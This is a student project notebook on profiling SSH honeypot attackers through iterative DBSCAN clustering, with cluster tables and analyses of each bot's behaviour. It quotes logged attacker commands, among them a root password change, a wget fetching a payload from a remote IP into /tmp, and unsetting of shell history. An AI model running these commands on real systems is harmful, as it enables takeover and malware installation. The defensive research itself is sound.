<div style="text-align: center;">
    <h1><strong>Alma Mater Studiorum - University of Bologna</strong></h1>
    

<div style="display:flex; justify-content:center; align-items:center; padding:5px;">
        <img src="../images_reports/image.png" style="height:300px; width:auto">
    </div>

<h2><strong>Cybersecurity</strong></h2>

<h3><strong>PROYECT</strong><br>
    <strong>Attacker Behavioral Profiling in SSH honeypots.</strong></h3>

<p><strong>STUDENTS</strong></p>
    <ul style="list-style-type:none; padding: 0;">
        <li><strong>Rubén Gil Martínez<strong></li>
        <li><strong>Guillermo López Pérez<strong></li>
        <li><strong>Jorge Mejías Donoso<strong></li>
    </ul>
</div>


## **3) Proposed Methodology: Iterative Hierarchical DBSCAN**

---

### *Rationale: Handling Variable Density in Behavioral Data*

Following the analysis of the previous clustering attempts, we identified a critical characteristic of the dataset: *heterogeneous density*.  
Attacker behaviors are not uniform; they range from:

- highly repetitive, automated actions → forming **extremely dense clusters**,  
- to sporadic, manual interactions by human operators → forming **sparse, irregular clusters**.

Standard algorithms such as **K-Means** fail due to their geometric assumptions, and even a single-pass **DBSCAN** struggles to find a one-size-fits-all density threshold. It either merges distinct groups or discards meaningful behaviors as noise.

---

### *The Algorithm: A Multi-Stage “Peeling” Approach*

To address these limitations, we propose a custom **Iterative Hierarchical DBSCAN** strategy.  
The core idea is to progressively isolate behavioral clusters *layer by layer*, starting from the most dense (highly automated bots) and moving toward the least dense (manual attackers).

---

### *Level 1: High-Density Capture (Automated Bots)*

*Hyperparameters:*  
- Small radius: epsilon
 
- Large min_samples

*Goal:*  
Identify the *hyper-dense regions* generated by fully automated bots executing identical or similar sequences of commands for a common purpose across thousands of sessions.

*Action:*  
Extract these clusters and *isolate the remaining data, which DBSCAN labels as *Noise (-1).

---

### *Iterative Relaxation (The “Peeling” Effect)*

*Input:*  
Noise from the previous iteration.

*Hyperparameter Adjustment per Iteration:*  
- *Increase* \(\epsilon\): captures more spread-out behavioral patterns  
- *Decrease* min_samples: allows detection of smaller, less frequent attacker groups  

*Logic:*  
This step progressively reveals:

- script kiddies with inconsistent behavior,  
- semi-automated tools,  
- advanced attackers with diverse interaction patterns.

Each iteration “peels away” another behavioral layer.

---

### *Termination & Analysis*

The process repeats until:

- the dataset is fully classified, or  
- only true anomalies remain.

*Post-Clustering Analysis:*  
Once the clusters are finalized, we will conduct a detailed inspection of the characteristics values of each session
to label each group’s intent and to characterize the underlying attacker type.

---

### *Why This Matters*

This hierarchical approach ensures that the dominant, high-density bot activity does not *overshadow* the subtler and more valuable signals of human or semi-automated attackers.  
It provides a flexible, density-aware framework tailored to the heterogeneous behavioral landscape of SSH intrusion attempts.


In [1]:
import pandas as pd
import numpy as np
from sklearn.preprocessing import StandardScaler
from sklearn.cluster import KMeans

In [2]:
# ==========================
# 1) Load Dataset
# ==========================
final_dataset = pd.read_csv("../DATASETS/attacker_behavioral_profiles_dataset_3.0.csv", index_col="session_id")
df = final_dataset.copy()
session_ids = df.index

df.dropna(inplace=True)

In [ ]:
# ==========================
# 1) Load Dataset for executed commands information
# ==========================
dataset_commands = pd.read_csv("../DATASETS/executed_commands.csv", index_col="session_id")

In [4]:
df = final_dataset.copy()
df.dropna(inplace=True)
df_reduced = df[['session_duration', 'command_error_rate', 'max_inter_command_time', 'mean_inter_command_time', 'std_inter_command_time', 'reconnaissance_ratio', 'exploit_ratio', 'unique_commands_ratio']]

In [5]:
from sklearn.cluster import DBSCAN

# ==========================
# 2) Escalar los datos
# ==========================
scaler = StandardScaler()
X_scaled = scaler.fit_transform(df_reduced)


dbscan = DBSCAN(eps=0.5, min_samples=350, metric='euclidean')
clusters = dbscan.fit_predict(X_scaled)

# ==========================
# 4) Añadir clusters al DataFrame limpio
# ==========================
df_reduced['cluster'] = clusters

# ==========================
# 5) Resultados
# ==========================
print("Número de clusters encontrados (excluyendo ruido):", len(set(clusters)) - (1 if -1 in clusters else 0), '\n')
print(df_reduced['cluster'].value_counts(), '\n')



Número de clusters encontrados (excluyendo ruido): 5 

cluster
 0    10322
 1     5126
-1     3452
 2      716
 4      386
 3      384
Name: count, dtype: int64 



C:\Users\Guille\AppData\Local\Temp\ipykernel_43748\4049319838.py:16: SettingWithCopyWarning: 
A value is trying to be set on a copy of a slice from a DataFrame.
Try using .loc[row_indexer,col_indexer] = value instead

See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy
  df_reduced['cluster'] = clusters


# **PCA**

In [6]:
import plotly.graph_objects as go
from sklearn.decomposition import PCA
from sklearn.preprocessing import MinMaxScaler
import numpy as np

# ==========================
# 1) PCA con 3 componentes
# ==========================
pca = PCA(n_components=3)
X_pca = pca.fit_transform(X_scaled)

In [7]:
# Variabilidad explicada por cada componente
var_exp = pca.explained_variance_ratio_

print("Porcentaje de varianza explicada por cada componente:")
for i, var in enumerate(var_exp):
    print(f"Componente {i+1}: {var*100:.2f}%")

# Variabilidad acumulada
var_acum = var_exp.cumsum()
print("\nPorcentaje de varianza acumulada:")
for i, var in enumerate(var_acum):
    print(f"Primer {i+1} componente(s): {var*100:.2f}%")

Porcentaje de varianza explicada por cada componente:
Componente 1: 40.82%
Componente 2: 25.11%
Componente 3: 16.38%

Porcentaje de varianza acumulada:
Primer 1 componente(s): 40.82%
Primer 2 componente(s): 65.93%
Primer 3 componente(s): 82.31%


In [8]:
# ==========================
# 1.1) ESCALAR PCA SOLO PARA VISUALIZAR
# ==========================
scaler_vis = MinMaxScaler()
X_pca_vis = scaler_vis.fit_transform(X_pca)

# ==========================
# 2) Preparar clusters
# ==========================
clusters = df_reduced['cluster'].values
unique_clusters = np.unique(clusters)

# ==========================
# 3) Crear figura interactiva
# ==========================
fig = go.Figure()
colors = ['red', 'blue', 'green', 'black', 'purple', 'brown',
          'pink', 'gray', 'cyan', 'magenta']

for i, cluster in enumerate(unique_clusters):
    cluster_mask = clusters == cluster
    label = f"Cluster {cluster}" if cluster != -1 else "Noise"

    fig.add_trace(go.Scatter3d(
        x=X_pca_vis[cluster_mask, 0],
        y=X_pca_vis[cluster_mask, 1],
        z=X_pca_vis[cluster_mask, 2],
        mode='markers',
        marker=dict(
            size=4,
            color=colors[i % len(colors)],
            opacity=0.85
        ),
        name=label
    ))

# ==========================
# 4) Layout
# ==========================
fig.update_layout(
    title="DBSCAN Clusters (PCA 3D Escalado para Visualización)",
    scene=dict(
        xaxis_title='PCA 1 (scaled)',
        yaxis_title='PCA 2 (scaled)',
        zaxis_title='PCA 3 (scaled)'
    ),
    width=800,
    height=600
)

# ==========================
# 5) Mostrar figura
# ==========================
fig.show()


In [9]:
fig = go.Figure()
colors = ['red', 'blue', 'green', 'black', 'purple', 'brown',
          'pink', 'gray', 'cyan', 'magenta']

for i, cluster in enumerate(unique_clusters):

    
    # ⛔ Saltar ruido
    if cluster == -1:
        continue
    
    cluster_mask = clusters == cluster
    label = f"Cluster {cluster}" if cluster != -1 else "Noise"

    fig.add_trace(go.Scatter3d(
        x=X_pca_vis[cluster_mask, 0],
        y=X_pca_vis[cluster_mask, 1],
        z=X_pca_vis[cluster_mask, 2],
        mode='markers',
        marker=dict(
            size=4,
            color=colors[i % len(colors)],
            opacity=0.85
        ),
        name=label
    ))

# ==========================
# 4) Layout
# ==========================
fig.update_layout(
    title="DBSCAN Clusters (PCA 3D Escalado para Visualización)",
    scene=dict(
        xaxis_title='PCA 1 (scaled)',
        yaxis_title='PCA 2 (scaled)',
        zaxis_title='PCA 3 (scaled)'
    ),
    width=800,
    height=600
)


def rotate_camera(angle):
    return dict(
        eye=dict(
            x=2*np.cos(angle),
            y=2*np.sin(angle),
            z=0.5
        )
    )

frames = []
angles = np.linspace(0, 2*np.pi, 120)  # 120 pasos para 360°

for angle in angles:
    frames.append(
        go.Frame(layout=dict(scene_camera=rotate_camera(angle)))
    )

fig.frames = frames

fig.update_layout(
    updatemenus=[
        dict(
            type="buttons",
            showactive=False,
            buttons=[
                dict(
                    label="▶ Auto-Rotate",
                    method="animate",
                    args=[
                        None,
                        dict(frame=dict(duration=50, redraw=True),
                             fromcurrent=True,
                             transition=dict(duration=0))
                    ]
                )
            ],
            x=0.1,
            y=0.05
        )
    ]
)
# ==========================
# 5) Mostrar figura
# ============
fig.show()

In [10]:
df.loc[df_reduced[df_reduced['cluster'] == 0].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
00081b571122,78.0,23.0,31.249671,6.333993,1.160163,1.173813,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0
0076d693f7fd,78.0,23.0,32.132288,6.536506,1.194688,1.211933,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0
00aa3ae5d33a,78.0,23.0,36.995369,7.981335,1.388428,1.529704,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0
012f382592c2,78.0,23.0,6.000740,0.534131,0.201693,0.094307,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0
0148a3eded81,79.0,23.0,47.535764,9.728765,1.794312,1.813615,0.086957,0.217391,0.0,0.025316,0.075949,0.538462,19.0
024821112d32,78.0,23.0,10.350692,1.550276,0.370669,0.273999,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0
0263a6b216dd,77.0,23.0,42.055636,9.345013,1.579619,1.763732,0.086957,0.130435,0.0,0.025974,0.051948,0.538462,19.0
029fbd9f9f17,78.0,23.0,8.615960,0.738894,0.239450,0.128861,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0
02c1bec458bd,78.0,23.0,6.770280,0.720533,0.234483,0.139145,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0


In [11]:
dataset_commands.loc['0076d693f7fd']

,message
session_id,
0076d693f7fd,CMD: cat /proc/cpuinfo | grep name | wc -l
0076d693f7fd,"CMD: echo ""root:gm8fN4LptkJH""|chpasswd|bash"
0076d693f7fd,"CMD: echo ""321"" > /var/tmp/.var03522123"
0076d693f7fd,CMD: rm -rf /var/tmp/.var03522123
0076d693f7fd,CMD: cat /var/tmp/.var03522123 | head -n 1
0076d693f7fd,CMD: cat /proc/cpuinfo | grep name | head -n 1...
0076d693f7fd,"CMD: free -m | grep Mem | awk '{print $2 ,$3, ..."
0076d693f7fd,CMD: ls -lh $(which ls)
0076d693f7fd,CMD: which ls


This bot:

Checks the CPU

cat /proc/cpuinfo

lscpu
→ To see if it’s a real machine or a sandbox.

Tries to CHANGE the root password

echo "root:gm8fN4LptkJH" | chpasswd
→ Clear attempt to take over the system.

Creates temporary hidden files

/var/tmp/.varXXXXX
→ Tests permissions and hides activity.

Deletes or modifies files in /var/tmp
→ Common malware directory because it's writable and rarely monitored.

Checks cron jobs

crontab -l
→ To see if persistence can be added.

Collects system information

w, top, uname, uname -a
→ Checks users, OS, container status, architecture.

Writes suspicious files

echo "root omega321" > /tmp/up.txt
→ Likely an indicator or test file.

Runs a Base64 payload

sleep 15s && ... "IyEvYmluL..."
→ Base64-encoded shell script that downloads and runs malware.

In [12]:
df.loc[df_reduced[df_reduced['cluster'] == 1].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
018dc4a4b877,41.0,19.0,12.066789,0.666725,0.448912,0.102372,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
01da6910d207,41.0,19.0,25.455374,1.164677,1.026140,0.116896,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
02125b4ced9a,41.0,19.0,29.965278,1.308146,1.180234,0.163214,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
028532e63dc0,41.0,19.0,25.048949,1.149239,1.041340,0.079126,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
02a7e70ddb65,41.0,19.0,14.076870,0.712860,0.536122,0.103506,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
02f52673bd4e,41.0,19.0,25.803133,1.198966,1.064629,0.099341,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
0309e1af2928,41.0,19.0,31.118224,1.673442,1.287276,0.232140,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
03c1def60656,41.0,19.0,30.101288,1.328828,1.236262,0.116541,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0
03f829f7160d,41.0,19.0,33.845752,1.754121,1.293918,0.251508,0.0,0.0,0.0,0.04878,0.02439,0.558824,16.0


In [13]:
dataset_commands.loc['018dc4a4b877']

,message
session_id,
018dc4a4b877,CMD: cat /proc/cpuinfo | grep name | wc -l
018dc4a4b877,"CMD: echo -e ""362729\nm13AVpAn01IZ\nm13AVpAn01..."
018dc4a4b877,"CMD: echo ""362729\nm13AVpAn01IZ\nm13AVpAn01IZ\..."
018dc4a4b877,"CMD: echo ""321"" > /var/tmp/.var03522123"
018dc4a4b877,CMD: rm -rf /var/tmp/.var03522123
018dc4a4b877,CMD: cat /var/tmp/.var03522123 | head -n 1
018dc4a4b877,CMD: cat /proc/cpuinfo | grep name | head -n 1...
018dc4a4b877,"CMD: free -m | grep Mem | awk '{print $2 ,$3, ..."
018dc4a4b877,CMD: ls -lh $(which ls)


This bot is performing the same reconnaissance & staging steps as the previous ones, but:

Instead of directly trying to change root password, it sends credential-like strings, probably testing a vulnerable script.

Still performing CPU/memory fingerprinting

Still using /var/tmp for persistence checks

Still checking cron

Still probing the environment before deploying malware

It is almost certainly part of the same botnet family, just a slightly different variant.

In [14]:
df.loc[df_reduced[df_reduced['cluster'] == 2].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
008c4e44013e,14.0,6.0,2.796228,0.337116,0.128707,0.170465,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
01802b82117b,14.0,6.0,2.249304,0.275983,0.105233,0.136861,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
01940692cfd9,14.0,6.0,2.833393,0.379712,0.134802,0.180516,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
01a2594b0068,14.0,6.0,3.126926,0.300947,0.118441,0.153707,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
02316f98b45d,14.0,6.0,2.238974,0.268809,0.102951,0.133754,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
0243a52a14f1,14.0,6.0,2.898659,0.359967,0.139492,0.181489,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
028781f59ed6,14.0,6.0,2.284489,0.280480,0.106642,0.139371,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
04019b8309eb,14.0,6.0,2.463499,0.273369,0.110872,0.140699,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0
04545f468206,14.0,6.0,2.366082,0.279369,0.104235,0.137586,0.333333,0.0,0.0,0.0,0.071429,0.333333,5.0


In [15]:
dataset_commands.loc['008c4e44013e']

,message
session_id,
008c4e44013e,CMD: shell
008c4e44013e,CMD: sh
008c4e44013e,CMD: enable
008c4e44013e,CMD: system
008c4e44013e,CMD: /bin/busybox SATORI
008c4e44013e,CMD: /bin/busybox cat /bin/busybox


This bot:

Attempt to access a shell

Check which commands are available

Verify whether BusyBox is installed

Identify the system architecture

This session is extremely characteristic of the Satori botnet (a Mirai variant).
Its behavior is short, direct, and strongly tied to IoT exploitation.

In [16]:
df.loc[df_reduced[df_reduced['cluster'] == 3].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
000875e79f26,16.0,6.0,4.589384,0.142440,0.059873,0.064026,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
0215812eaf08,16.0,6.0,2.421756,0.268390,0.101967,0.132542,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
0329ccfd57d1,16.0,6.0,2.432236,0.295349,0.110743,0.139678,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
06e9853fd458,16.0,6.0,3.360588,0.344455,0.132439,0.174258,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
0768ddd532b9,16.0,6.0,5.737490,0.376167,0.143553,0.188790,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
077041bb4e3c,16.0,6.0,1.558697,0.181438,0.064281,0.084217,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
082ce35ab9d8,16.0,6.0,4.695774,0.362381,0.140117,0.185500,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
088f527935ba,16.0,6.0,2.521171,0.296002,0.111167,0.145670,0.5,0.0,0.0,0.0,0.0625,0.375,6.0
0a904cbb7d5b,16.0,6.0,3.424090,0.388817,0.153366,0.196926,0.5,0.0,0.0,0.0,0.0625,0.375,6.0


In [17]:
dataset_commands.loc['000875e79f26']

,message
session_id,
000875e79f26,CMD: shell
000875e79f26,CMD: sh
000875e79f26,CMD: enable
000875e79f26,CMD: system
000875e79f26,CMD: /bin/busybox SATORI
000875e79f26,CMD: /bin/busybox cat /bin/busybox || while re...


This bot is doing exacly the same than before, but with slight differences in their features.

In [18]:
df_reduced[df_reduced['cluster'] == 4]

,session_duration,command_error_rate,max_inter_command_time,mean_inter_command_time,std_inter_command_time,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,cluster
session_id,,,,,,,,,
037bb72bdc5b,1.740881,0.100000,0.021974,0.007870,0.004692,0.0,0.032258,0.050000,4
04979d0de12b,1.354753,0.100000,0.017672,0.006855,0.003109,0.0,0.032258,0.050000,4
063c006e0c46,2.099040,0.100000,0.017202,0.006710,0.003020,0.0,0.032258,0.050000,4
0767a8c14a64,1.633410,0.100000,0.019200,0.008429,0.003240,0.0,0.032258,0.050000,4
07eca453ff00,1.245234,0.100000,0.025540,0.007527,0.004627,0.0,0.032258,0.050000,4
...,...,...,...,...,...,...,...,...,...
fa1741183f17,0.581971,0.100000,0.017436,0.006769,0.003008,0.0,0.032258,0.050000,4
fb6a0c591a7d,1.823523,0.100000,0.017949,0.008989,0.003539,0.0,0.032258,0.050000,4
fb916d224100,2.254640,0.095238,0.021934,0.008151,0.004967,0.0,0.031250,0.047619,4


In [19]:
dataset_commands.loc['037bb72bdc5b']

,message
session_id,
037bb72bdc5b,CMD: shell
037bb72bdc5b,CMD: sh
037bb72bdc5b,CMD: enable
037bb72bdc5b,CMD: system
037bb72bdc5b,CMD: ping ; sh
037bb72bdc5b,CMD: >/tmp/t && cd /tmp/ && >retrieve; >.t
037bb72bdc5b,CMD: >/var/t && cd /var/ && >retrieve; >.t
037bb72bdc5b,CMD: >/dev/t && cd /dev/ && >retrieve; >.t
037bb72bdc5b,CMD: >/mnt/t && cd /mnt/ && >retrieve; >.t


This bot:

Probes for a shell: shell, sh, system, ping ; sh

Tests write permissions across many system directories (/tmp, /var, /dev, /etc, /bin, /usr, /boot, /sys, /) by creating dummy files.

Creates files named t, .t, and retrieve to check where it can drop payloads.

Copies BusyBox (busybox cp ... retrieve) to get a portable command toolkit for later exploitation.

Scans critical paths to decide where to install malware.

→ Clearly a malicious infection-stage bot performing filesystem probing and preparing for persistence.

# DBSCAN (LEVEL 2)

In [20]:
df_reduced_noise = df_reduced[df_reduced['cluster'] == -1]

In [21]:
scaler = StandardScaler()
X_scaled = scaler.fit_transform(df_reduced_noise)


dbscan = DBSCAN(eps=1, min_samples=150, metric='euclidean')
clusters = dbscan.fit_predict(X_scaled)

# ==========================
# 4) Añadir clusters al DataFrame limpio
# ==========================
df_reduced_noise['cluster'] = clusters

# ==========================
# 5) Resultados
# ==========================
print("Número de clusters encontrados (excluyendo ruido):", len(set(clusters)) - (1 if -1 in clusters else 0), '\n')
print(df_reduced_noise['cluster'].value_counts(), '\n')

Número de clusters encontrados (excluyendo ruido): 3 

cluster
 0    2358
-1     471
 1     467
 2     156
Name: count, dtype: int64 



C:\Users\Guille\AppData\Local\Temp\ipykernel_43748\4271789002.py:11: SettingWithCopyWarning:


A value is trying to be set on a copy of a slice from a DataFrame.
Try using .loc[row_indexer,col_indexer] = value instead

See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy



In [22]:
X_pca = pca.fit_transform(X_scaled)

In [23]:
# ==========================
# 1.1) ESCALAR PCA SOLO PARA VISUALIZAR
# ==========================
scaler_vis = MinMaxScaler()
X_pca_vis = scaler_vis.fit_transform(X_pca)

# ==========================
# 2) Preparar clusters
# ==========================
clusters = df_reduced_noise['cluster'].values
unique_clusters = np.unique(clusters)

# ==========================
# 3) Crear figura interactiva
# ==========================
fig = go.Figure()
colors = ['red', 'blue', 'green', 'black', 'purple', 'brown',
          'pink', 'gray', 'cyan', 'magenta']

for i, cluster in enumerate(unique_clusters):
    if cluster == -1:
        continue
    cluster_mask = clusters == cluster
    label = f"Cluster {cluster}" if cluster != -1 else "Noise"

    fig.add_trace(go.Scatter3d(
        x=X_pca_vis[cluster_mask, 0],
        y=X_pca_vis[cluster_mask, 1],
        z=X_pca_vis[cluster_mask, 2],
        mode='markers',
        marker=dict(
            size=4,
            color=colors[i % len(colors)],
            opacity=0.85
        ),
        name=label
    ))

# ==========================
# 4) Layout
# ==========================
fig.update_layout(
    title="DBSCAN Clusters (PCA 3D Escalado para Visualización)",
    scene=dict(
        xaxis_title='PCA 1 (scaled)',
        yaxis_title='PCA 2 (scaled)',
        zaxis_title='PCA 3 (scaled)'
    ),
    width=800,
    height=600
)


def rotate_camera(angle):
    return dict(
        eye=dict(
            x=2*np.cos(angle),
            y=2*np.sin(angle),
            z=0.5
        )
    )

frames = []
angles = np.linspace(0, 2*np.pi, 120)  # 120 pasos para 360°

for angle in angles:
    frames.append(
        go.Frame(layout=dict(scene_camera=rotate_camera(angle)))
    )

fig.frames = frames

fig.update_layout(
    updatemenus=[
        dict(
            type="buttons",
            showactive=False,
            buttons=[
                dict(
                    label="▶ Auto-Rotate",
                    method="animate",
                    args=[
                        None,
                        dict(frame=dict(duration=50, redraw=True),
                             fromcurrent=True,
                             transition=dict(duration=0))
                    ]
                )
            ],
            x=0.1,
            y=0.05
        )
    ]
)
# ==========================
# 5) Mostrar figura
# ==========================
fig.show()


In [24]:
df.loc[df_reduced_noise[df_reduced_noise['cluster'] == 0].index].head(10) # Bots de baja calidad o experimentales

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
010ad96c3f21,16.0,7.0,68.448152,19.502649,3.257964,7.958238,0.428571,0.000000,0.0,0.000000,0.062500,0.285714,6.0
01310728d909,21.0,9.0,17.792190,1.408968,1.240789,0.217969,0.000000,0.000000,0.0,0.095238,0.047619,0.500000,11.0
01efe494fcc0,16.0,7.0,68.608636,19.424206,3.242624,7.927324,0.428571,0.000000,0.0,0.000000,0.062500,0.285714,6.0
02c2ce40e41c,16.0,7.0,68.342209,19.261767,3.215242,7.861160,0.428571,0.000000,0.0,0.000000,0.062500,0.285714,6.0
035b50f2544d,16.0,7.0,68.438979,19.373217,3.233841,7.906647,0.428571,0.000000,0.0,0.000000,0.062500,0.285714,6.0
035dd32418e4,16.0,7.0,68.254606,19.170161,3.198320,7.824572,0.428571,0.000000,0.0,0.000000,0.062500,0.285714,6.0
04325e1c3612,18.0,10.0,1.168321,0.146606,0.062246,0.057499,0.300000,0.000000,0.0,0.000000,0.055556,0.153846,12.0
046f8497b33c,16.0,7.0,68.138285,19.250063,3.213395,7.856331,0.428571,0.000000,0.0,0.000000,0.062500,0.285714,6.0
05b4b4baeca0,78.0,23.0,128.298447,27.763230,4.396312,5.476454,0.086957,0.173913,0.0,0.025641,0.064103,0.538462,19.0


In [25]:
dataset_commands.loc['010ad96c3f21']

,message
session_id,
010ad96c3f21,CMD: enable
010ad96c3f21,CMD: development
010ad96c3f21,CMD: shell
010ad96c3f21,CMD: sh
010ad96c3f21,CMD: linuxshell
010ad96c3f21,CMD: /bin/busybox TSUNAMI
010ad96c3f21,CMD: /bin/busybox cat /bin/busybox


This bot:

Probes for a shell: enable, development, shell, sh, linuxshell

Runs BusyBox commands: /bin/busybox TSUNAMI (DDoS botnet malware)

Reads the BusyBox binary: /bin/busybox cat /bin/busybox to inspect or verify it

→ This is a malicious probing bot trying to check if BusyBox is available and preparing to run commands or payloads through it.

In [26]:
df.loc[df_reduced_noise[df_reduced_noise['cluster'] == 1].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
0e9a116b674c,7.0,1.0,2.695724,0.0,0.0,0.0,0.0,0.0,0.0,0.285714,0.142857,1.0,1.0
0ed55be31c3e,8.0,1.0,2.595570,0.0,0.0,0.0,0.0,0.0,0.0,0.375000,0.125000,1.0,1.0
361ddb8dd445,8.0,1.0,3.258213,0.0,0.0,0.0,0.0,0.0,0.0,0.375000,0.125000,1.0,1.0
40b223ba5f07,7.0,1.0,2.696347,0.0,0.0,0.0,0.0,0.0,0.0,0.285714,0.142857,1.0,1.0
420a433b69cc,7.0,1.0,2.735808,0.0,0.0,0.0,0.0,0.0,0.0,0.285714,0.142857,1.0,1.0
45603fc9fca7,7.0,1.0,2.667823,0.0,0.0,0.0,0.0,0.0,0.0,0.285714,0.142857,1.0,1.0
476098b0b828,7.0,1.0,2.672163,0.0,0.0,0.0,0.0,0.0,0.0,0.285714,0.142857,1.0,1.0
56e43c821f90,8.0,1.0,2.511564,0.0,0.0,0.0,0.0,0.0,0.0,0.375000,0.125000,1.0,1.0
648ea6d72965,8.0,1.0,4.498856,0.0,0.0,0.0,0.0,0.0,0.0,0.375000,0.125000,1.0,1.0


In [27]:
dataset_commands.loc['0e9a116b674c']

message    CMD:  cd /tmp; wget http://187.113.34.8/read.t...
Name: 0e9a116b674c, dtype: object

In [28]:
dataset_commands.loc['648ea6d72965']

message    CMD: top -bn1
Name: 648ea6d72965, dtype: object

Here we have two different bots:

Bot 1:

Changes directory to /tmp
/tmp is writable for all users → malware usually uses it.

Downloads a file from a remote IP
wget http://187.113.34.8/read.txt
→ Fetches a malicious script or payload hosted on that IP.

Bot 2:

Checks system resources
top -bn1
→ Inspects CPU and memory to see if the machine is suitable for mining, botnet activity, or further payload execution.

In [29]:
df.loc[df_reduced_noise[df_reduced_noise['cluster'] == 2].index].head(10)

,num_events,num_commands,session_duration,max_inter_command_time,mean_inter_command_time,std_inter_command_time,command_error_rate,file_transfer_ratio,login_error_rate,reconnaissance_ratio,exploit_ratio,unique_commands_ratio,command_diversity
session_id,,,,,,,,,,,,,
a58d9f7733c1,6.0,1.0,131.659141,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.333333,0.166667,0.500000,2.0
dcb1be3bf5fb,8.0,3.0,15.199545,1.408061,1.299961,0.152876,0.0,0.0,0.0,0.250000,0.125000,0.333333,3.0
6949f4703a02,6.0,1.0,4.974362,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.333333,0.166667,0.500000,2.0
a328ccd0438a,6.0,1.0,3.968373,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.333333,0.166667,0.500000,2.0
e5a2113e0c22,7.0,1.0,2.900263,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.285714,0.142857,0.555556,5.0
03396d14a72e,6.0,1.0,0.741501,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.333333,0.166667,0.500000,2.0
0391c045cf87,6.0,1.0,0.640105,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.333333,0.166667,0.500000,2.0
06d1d6db67d2,6.0,1.0,0.692197,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.333333,0.166667,0.500000,2.0
09e1d22fd3f4,6.0,1.0,1.337243,0.000000,0.000000,0.000000,0.0,0.0,0.0,0.333333,0.166667,0.500000,2.0


In [30]:
dataset_commands.loc['a328ccd0438a']

message    CMD: uname -a;unset HISTORY HISTFILE HISTSAVE ...
Name: a328ccd0438a, dtype: object

This cluster mainly contains this bot:

Runs uname -a
Prints full system information (kernel, OS, architecture).
Used for reconnaissance to decide what exploits or binaries will work.

Unsets shell history variables
unset HISTORY HISTFILE HISTSAVE …
Disables command logging.
Used for defense evasion to avoid leaving traces.

## DBSCAN (LEVEL 3)

In [31]:
df_reduced_noise_2 = df_reduced_noise[df_reduced_noise['cluster'] == -1]

In [32]:
scaler = StandardScaler()
X_scaled = scaler.fit_transform(df_reduced_noise_2)


dbscan = DBSCAN(eps=1, min_samples=75, metric='euclidean')
clusters = dbscan.fit_predict(X_scaled)

# ==========================
# 4) Añadir clusters al DataFrame limpio
# ==========================
df_reduced_noise_2['cluster'] = clusters

# ==========================
# 5) Resultados
# ==========================
print("Número de clusters encontrados (excluyendo ruido):", len(set(clusters)) - (1 if -1 in clusters else 0), '\n')
print(df_reduced_noise_2['cluster'].value_counts(), '\n')

Número de clusters encontrados (excluyendo ruido): 3 

cluster
 0    130
 2    120
 1    113
-1    108
Name: count, dtype: int64 



C:\Users\Guille\AppData\Local\Temp\ipykernel_43748\2652282380.py:11: SettingWithCopyWarning:


A value is trying to be set on a copy of a slice from a DataFrame.
Try using .loc[row_indexer,col_indexer] = value instead

